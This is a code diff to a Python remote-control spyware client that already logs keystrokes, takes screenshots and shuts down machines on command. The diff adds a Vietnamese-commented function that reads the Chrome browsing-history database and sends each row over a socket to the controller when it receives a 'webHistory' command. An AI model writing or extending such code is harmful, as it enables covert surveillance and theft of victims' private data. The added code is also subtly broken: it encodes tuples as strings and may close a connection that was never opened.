@@ -1,3 +1,4 @@
+import sqlite3
 from pynput.keyboard import Listener
 import socket
 import pyautogui
@@ -89,7 +90,29 @@ def getAppHistory():
         current_apps = running_apps
         
         time.sleep(1)
-        
+def get_chrome_history():
+    # Đường dẫn đến cơ sở dữ liệu lịch sử của Google Chrome
+    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default'
+    history_db = os.path.join(data_path, 'History')
+
+    # Kết nối đến cơ sở dữ liệu lịch sử
+    try:
+        connection = sqlite3.connect(history_db)
+        cursor = connection.cursor()
+
+        # Thực hiện truy vấn để lấy dữ liệu lịch sử
+        cursor.execute('SELECT * FROM urls')
+        history = cursor.fetchall()
+
+        for row in history:
+            print(row)
+            clientSocket.send(row.encode('utf-8'))
+
+    except sqlite3.OperationalError as e:
+        print(e)
+    finally:
+        # Đóng kết nối
+        connection.close()       
 with Listener(on_press=on_press) as parent:
     try:
         while True:
@@ -99,6 +122,8 @@ with Listener(on_press=on_press) as parent:
                 takeScreenshot()
             elif message == 'appHistory':
                 getAppHistory()
+            elif message == 'webHistory':
+                get_chrome_history()    
             elif message == 'shutdown':
                 os.system("shutdown /s /t 1")
             elif message == 'restart':
